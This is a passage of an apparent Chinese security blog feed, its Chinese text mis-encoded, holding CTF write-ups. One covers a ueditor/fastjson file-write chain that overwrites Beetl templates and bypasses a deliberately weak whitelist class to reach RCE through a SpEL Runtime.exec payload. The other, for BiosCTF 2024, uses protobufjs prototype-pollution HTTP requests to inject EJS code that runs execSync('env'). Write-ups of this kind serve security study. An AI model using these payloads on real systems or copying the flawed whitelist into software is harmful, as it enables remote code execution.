class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒç‚¹æ˜¯è¯¥æ–¹æ³•ï¼ˆåº”è¯¥ï¼‰ä»…æ”¯æŒç»å¯¹è·¯å¾„æ–‡ä»¶å†™å…¥ï¼Œ<code>MiscCodec</code>ä¸­é™åˆ¶äº†ç›¸å¯¹è·¯å¾„å†™å…¥ã€‚ä¸è¿‡é¢˜ç›®åº”è¯¥ä¼šç»™<code>docker</code>æ‰€ä»¥é€‰æ‰‹åˆ°æ—¶å€™çœ‹<code>docker</code>é‡Œçš„æ¨¡æ¿è·¯å¾„å°±å¯ä»¥äº†ã€‚å¦‚æœéš¾åº¦ä¸å¤Ÿçš„è¯ç»å¯¹è·¯å¾„è¿™éƒ¨åˆ†å¯ä»¥å½“ä¸ªè€ƒç‚¹ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> InetAddress<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> Inet4Address<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> Inet6Address<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> File<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>strVal<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>FILE_RELATIVE_PATH_SUPPORT<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"file relative path not support."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>strVal<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸‰ç‚¹æ˜¯å†™ä¸è¿›å»åŒå¼•å·<code>&quot;</code>ï¼Œåˆ†å·<code>;</code>ä¹‹ç±»çš„å­—ç¬¦ã€‚è¿™éƒ¨åˆ†ä¸æ˜¯ä»»æ„æ–‡ä»¶å†™è¿™æ¡<code>gadget</code>çš„é—®é¢˜ï¼Œè€Œæ˜¯å› ä¸º<code>ueditor</code>è¿™é‡Œçš„<code>JSON</code>æ³¨å…¥æ˜¯ä¸ª<code>http</code>è¯·æ±‚å¤´ä¸­çš„<code>filename</code>æ³¨å…¥ï¼Œæ‰€ä»¥å†™ä¸€äº›å¥‡æ€ªå­—ç¬¦ä¼šå¯¼è‡´<code>http</code>è¯·æ±‚å‡ºç°ä¸€äº›é—®é¢˜ã€‚ç»“åˆ<code>beetl</code>è¯­æ³•ç”¨<code>parameter.a</code>å°±èƒ½ç»•è¿‡äº†ã€‚åç»­åœ¨è®¿é—®æ¶æ„æ¨¡æ¿æ—¶åŠ ä¸ªå‚æ•°<code>?a</code>å³å¯ã€‚</p><h4 id="beetlæ¨¡æ¿RCE"><a href="#beetlæ¨¡æ¿RCE" class="headerlink" title="beetlæ¨¡æ¿RCE"></a>beetlæ¨¡æ¿RCE</h4><p>è¿™éƒ¨åˆ†å’Œæœ¬æ–‡ä¸»æ—¨æ— å…³å•¦ã€‚</p><p><code>beetle</code>å›½äº§æ¨¡æ¿å®é™…ä¸Šå¾ˆå¥½<code>RCE</code>(è¯è¯´ç»è¿‡<code>RWCTF thymeleaf</code>é‚£é“é¢˜çš„æ´—ç¤¼åçœ‹å•¥æ¨¡æ¿éƒ½æœ‰è‡ªä¿¡äº†)ï¼Œæ¨¡æ¿æ”¯æŒ<code>java</code>æ–¹æ³•ä»¥åŠå±æ€§è°ƒç”¨ã€‚å¹¶ä¸”é˜²æŠ¤ç±»<code>DefaultNativeSecurityManager</code>å°±ä¸€ä¸ªé»‘åå•ï¼Œç¿»ç¿»<code>issue</code>å°±èƒ½æ‰¾åˆ°<code>payload</code>ï¼Œå³ä¾¿ä¿®äº†è¿˜æ˜¯ä¼šæœ‰ä¸€å¤§å †ã€‚</p><p>æ‰€ä»¥æˆ‘å‚è€ƒ<code>patch</code>å†™äº†ä¸€ä¸ªçœ‹ä¼¼æ— æ‡ˆå¯å‡»çš„ç™½åå•ç±»ã€‚</p><p>åªå…è®¸è°ƒç”¨<code>venom.elephantcms</code>çš„æ–¹æ³•ï¼Œé€‰æ‰‹åªèƒ½è°ƒç”¨æˆ‘è‡ªå·±å†™çš„æ–¹æ³•ï¼Œè€Œå¾€ä¸‹ç¿»ç¿»å°±æ‰¾åˆ°äº†è¿™ä¸ªç±»å±…ç„¶æœ‰ä¸ª<code>test</code>æ–¹æ³•å¯ä»¥é‡æ–°å®šä¹‰<code>callPattern</code>ç™½åå•ï¼Œ<code>callPattern</code>æˆ‘æ•…æ„æ²¡å†™<code>final</code>ä¿®é¥°ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WhiteListNativeSecurityManager</span> <span class="token keyword">implements</span> <span class="token class-name">NativeSecurityManager</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Pattern callPattern <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">WhiteListNativeSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">allow</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"venom.elephantcms"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">permit</span><span class="token punctuation">(</span>Object resourceId<span class="token punctuation">,</span> Class <span class="token class-name">c</span><span class="token punctuation">,</span> Object target<span class="token punctuation">,</span> String method<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//            WhiteListNativeSecurityManager.class.getClassLoader()</span>            <span class="token comment" spellcheck="true">// å…è®¸è°ƒç”¨ï¼Œä½†å®é™…ä¸Šä¼šåœ¨åœ¨å…¶åè°ƒç”¨ä¸­æŠ¥é”™ã€‚ä¸å½’æ­¤å¤„ç®¡ç†</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        Runtime.getRuntime()</span>        String name <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String className <span class="token operator">=</span> null<span class="token punctuation">;</span>        String pkgName <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// æ— åŒ…åï¼Œè‚¯å®šå®‰å…¨ï¼Œå…è®¸è°ƒç”¨</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span>  callPattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">test</span><span class="token punctuation">(</span>String test<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">allow</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     *  æŒ‡å®šç™½åå•ï¼Œé»˜è®¤æ˜¯java.util     * @param calls ,è°ƒç”¨ï¼Œå¦‚ [java.util,java.io.File]     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">allow</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> calls<span class="token punctuation">)</span><span class="token punctuation">{</span>        StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>String pkg<span class="token operator">:</span>calls<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> pkg<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> classCall <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>Character<span class="token punctuation">.</span><span class="token function">isUpperCase</span><span class="token punctuation">(</span>pkg<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>c<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                classCall <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>classCall<span class="token punctuation">)</span><span class="token punctuation">{</span>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pkg<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"\\."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pkg<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"\\."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\\..*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        sb<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        callPattern <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//    public static void main(String[] args) {</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        {</span><span class="token comment" spellcheck="true">//            test("java.lang");</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èƒ½è‡ªå·±å®šä¹‰ç™½åå•ç±»çš„è¯å°±éšä¾¿ç»•äº†ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æ€è·¯å¾ˆæ˜ç¡®ï¼šé€šè¿‡æ„é€ æ¶æ„çš„æ–‡ä»¶åæ‰“ä¸€ä¸ª<code>JSON</code>æ³¨å…¥æ”»å‡»<code>parseObject</code>è¦†ç›–<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl</code>ï¼Œç¬¬ä¸€æ¬¡æ–‡ä»¶å†™å…¥è°ƒç”¨<code>test</code>æ–¹æ³•è¦†ç›–ç™½åå•å¤šæ”¾ç‚¹åŒ…è·¯å¾„ã€‚</p><pre class="line-numbers language-bash"><code class="language-bash">$<span class="token punctuation">{</span>@nese.elephantcms.common.WhiteListNativeSecurityManager.test<span class="token punctuation">(</span><span class="token string">'org.springframework,java.beans,venom.elephantcms'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬äºŒæ¬¡æ–‡ä»¶å†™å…¥è¦†ç›–<code>upload.btl</code>æ‰“<code>RCE</code>å³å¯ã€‚</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">${@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()}</span>/upload?a<span class="token operator">=</span>org.springframework.expression.spel.standard.SpelExpressionParser<span class="token operator">&amp;</span>b<span class="token operator">=</span>new java.util.Scanner<span class="token punctuation">(</span>T<span class="token punctuation">(</span>java.lang.Runtime<span class="token punctuation">)</span>.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">'{command}'</span><span class="token punctuation">)</span>.getInputStream<span class="token punctuation">(</span><span class="token punctuation">))</span>.next<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸è¿‡è¿˜æœ‰ä¸ªå‘ç‚¹å°±æ˜¯ç¬¬äºŒæ­¥è¦†ç›–çš„æ¨¡æ¿ä¸èƒ½æ˜¯<code>test.btl</code>äº†ï¼Œå¯èƒ½æ˜¯ç¼“å­˜çš„åŸå› å¯¼è‡´å³ä¾¿å†™å…¥ç¬¬äºŒæ¬¡çš„<code>payload</code>è®¿é—®æ¨¡æ¿è¿˜æ˜¯ä¼šæ‰§è¡Œç¬¬ä¸€æ¬¡çš„<code>payload</code>ã€‚</p><p>æ¢­ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1708172558206.png" alt="1708172558206"></p><h4 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>â€œéšä¾¿æ‰“æ‰“â€å¸ˆå‚…åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­åšå‡ºäº†è¿™é“é¢˜ï¼Œç”¨çš„æ˜¯<code>fastjson mysql</code>ä»»æ„æ–‡ä»¶è¯»å‡ºæ¥çš„<code>flag</code>ï¼Œæˆ‘è§‰å¾—åªè¦å®¡å‡ºæ¥<code>json</code>æ‹¼æ¥å°±ç®—æ˜¯é¢„æœŸã€‚å¦å¤–å…¶å®ä»»æ„æ–‡ä»¶å†™<code>jsp</code>ä¹Ÿå¯ä»¥ï¼ˆå±å®æ˜¯å°ä¸‘äº†ï¼‰ï¼Œä¸è¿‡ç”±äºæŒ–çš„é‚£ä¸ª<code>day</code>æ˜¯<code>jfinal</code>æ¡†æ¶å†™çš„ï¼Œ<code>filter</code>è¿‡æ»¤äº†<code>jsp</code>ï¼Œä¸è¿‡ä¹Ÿæœ‰åŠæ³•ç»•è¿‡å°±æ˜¯äº†ã€‚<br>å…³äº<code>jsp</code>å†™<code>webshell</code>éœ€è¦åˆ†å·<code>;</code>çš„é—®é¢˜ï¼ˆå†™ä¸äº†åˆ†å·çš„åŸå› åœ¨ä¸Šé¢æåˆ°äº†ï¼‰ï¼Œæˆ‘å½“æ—¶æ˜¯æ²¡æœ‰è§£å†³æ‰€ä»¥è¿™é‡Œé¢„æœŸè§£æ˜¯è¦†ç›–<code>.btl</code>æ¨¡ç‰ˆã€‚ç°åœ¨æƒ³æƒ³åº”è¯¥æœ‰æ–¹æ³•è§£å†³ï¼Œä¹‹å‰è¯»<code>RFC</code>æ ‡å‡†çš„æ—¶å€™å¥½åƒçœ‹åˆ°æœ‰å¯ä»¥<code>url</code>ç¼–ç è¯·æ±‚å¤´çš„æ“ä½œã€‚</p><h3 id="è‡ªåŠ¨åŒ–æ€è·¯"><a href="#è‡ªåŠ¨åŒ–æ€è·¯" class="headerlink" title="è‡ªåŠ¨åŒ–æ€è·¯"></a>è‡ªåŠ¨åŒ–æ€è·¯</h3><p><code>github</code>æ˜¯æ”¯æŒä»£ç æœç´¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>github</code>æä¾›çš„æœç´¢æ¥å£æ¥å¯»æ‰¾å¼•å…¥<code>ueditor</code>çš„<code>java</code>é¡¹ç›®ï¼Œä½†æ˜¾ç„¶å›½å†…çš„<code>cms</code>å¼•å…¥<code>ueditor</code>ä¼šå¤šä¸€äº›ï¼Œä½†å¯æƒœ<code>gitee</code>ä¸Šä¸æä¾›ä»£ç æ£€ç´¢åŠŸèƒ½ï¼Œå³ä¾¿å¦‚æ­¤ï¼Œæˆ‘è¿˜æ˜¯æ‰¾åˆ°äº†ä¸€ç™¾å¤šä¸ªé¡¹ç›®ã€‚</p><p>ç¬¬äºŒæ­¥å°±æ˜¯ç®€å•çš„æ±¡ç‚¹åˆ†æï¼Œè¿™ä¸€éƒ¨åˆ†å·æ‡’å°±å‘½ä»¤è¡Œè°ƒ<code>semgrep</code>æ¥åšï¼ˆå…¶å®æ˜¯ä¸ä¼šï¼‰ï¼Œæœ€åå‘ç°æ¼æ´è¿˜æ˜¯æŒºå°‘çš„ã€‚ã€‚ä¸è¿‡ä¹Ÿç®—æ˜¯ä¸€æ¬¡å°è¯•å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Biosctf 2024 writeup</title>
      <link href="/2024/02/28/biosctf2024/"/>
      <url>/2024/02/28/biosctf2024/</url>
      
        <content type="html"><![CDATA[<h4 id="requirenotes"><a href="#requirenotes" class="headerlink" title="requirenotes"></a>requirenotes</h4><h5 id="éé¢„æœŸ1"><a href="#éé¢„æœŸ1" class="headerlink" title="éé¢„æœŸ1"></a>éé¢„æœŸ1</h5><p><code>protobufjs</code>æœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œåé¢çš„<code>revenge</code>ä¹Ÿæœ‰ã€‚</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># npm audit report</span>protobufjs  7.0.0 - 7.2.3Severity: criticalprotobufjs Prototype Pollution vulnerability - https://github.com/advisories/GHSA-h755-8qp9-cq85fix available via <span class="token variable"><span class="token variable">`</span><span class="token function">npm</span> audit fix --force<span class="token variable">`</span></span>Will <span class="token function">install</span> protobufjs@7.2.6, <span class="token function">which</span> is outside the stated dependency rangenode_modules/protobufjs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/create</code>ä¸‹é¢æ­£å¥½æœ‰ä¸€ä¸ªåˆ©ç”¨ç‚¹<code>parse</code>ï¼Œåªè¦<code>settings.proto</code>å¯æ§å°±èƒ½åŸå‹é“¾æ±¡æŸ“äº†ã€‚</p><pre class="line-numbers language-js"><code class="language-js">schema <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./settings.proto'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root <span class="token operator">=</span> protobuf<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>schema<span class="token punctuation">)</span><span class="token punctuation">.</span>root<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è€Œ<code>/customise</code>æ­£å¥½èƒ½æ”¹<code>settings.proto</code>ã€‚<code>author</code>å¯æ§ï¼Œç›´æ¥åœ¨<code>author</code>é‚£é‡Œæ±¡æŸ“å†™<code>payload</code>å°±è¡Œäº†ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">let</span> author <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'author'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token punctuation">{</span>    protoContents<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token string">`  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>author<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string author = 3 [default="user"];`</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./settings.proto'</span><span class="token punctuation">,</span> protoContents<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œ<code>ejs compile</code>é‚£é‡Œæœ‰ä¸ªæ‹¼æ¥ï¼Œå¯ä»¥ä»£ç æ³¨å…¥ã€‚å…³é”®åœ¨äº<code>client</code>å’Œ<code>escapeFn</code>é»˜è®¤éƒ½æ˜¯<code>null</code>ï¼Œæ‰€ä»¥å¯ä»¥åŸå‹é“¾æ±¡æŸ“è¦†ç›–è¿™ä¸¤ä¸ªã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">{</span>  src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">{</span>    src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥ç¬¬ä¸€æ¬¡æ±¡æŸ“<code>client</code>ï¼Œæäº¤ä¸€ä¸‹<code>note</code>è§¦å‘æ±¡æŸ“ã€‚</p><pre class="line-numbers language-http"><code class="language-http">POST /customise HTTP/1.1<span class="token header-name keyword">Host:</span> ch1581141629.ch.eng.run<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Encoding:</span> identity<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Content-Length:</span> 53<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<span class="token application/json"><span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"required"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"option(a).constructor.prototype.client=1;\n required"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒæ¬¡æ±¡æŸ“<code>escapeFunction</code>ï¼Œéšä¾¿è®¿é—®é¡µé¢è§¦å‘<code>ejs</code>æ¸²æŸ“ï¼Œæ²¡å›æ˜¾é¢å¤–æ‰“ä¸ªå›æ˜¾å°±è¡Œäº†ã€‚</p><pre class="line-numbers language-http"><code class="language-http">POST /customise HTTP/1.1<span class="token header-name keyword">Host:</span> ch1581141629.ch.eng.run<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Encoding:</span> identity<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Content-Length:</span> 31<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<span class="token application/json"><span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"required"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"option(a).constructor.prototype.escapeFunction=\"escapeFn;__output=global.process.mainModule.require('child_process').execSync('env').toString();return __output\";\n required"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709104937652.png" alt="1709104937652"></p><p>PSï¼š</p><p>è¿™é‡Œ<code>settings[&#39;view options&#39;]</code>å¦‚æœå­˜åœ¨çš„è¯ä¼šæ‹·è´åˆ°<code>opts</code>ä¸­ã€‚ä½†æ˜¯<code>view options</code>è¿™ä¸ª<code>attribute</code>æ²¡åŠæ³•æ±¡æŸ“ï¼Œå¯„ã€‚è°ƒåŠå¤©ä¹Ÿæ²¡æ˜ç™½ä¸ºå•¥ä¸è¡Œï¼ŒçŒœæµ‹æ˜¯<code>protobuf.js</code>è§£æçš„æ—¶å€™å‘ç°æœ‰ç©ºæ ¼å°±è®¤ä¸ºæ˜¯èµ‹å€¼æ“ä½œï¼Ÿä¸è¿‡è¿™ç§å¸¦ç©ºæ ¼çš„å±æ€§ä¸åŠ å•å¼•å·ä¼°è®¡ä¸å¤ªå¯èƒ½æ±¡æŸ“çš„ä¸Šã€‚</p><pre class="line-numbers language-js"><code class="language-js">viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">{</span>  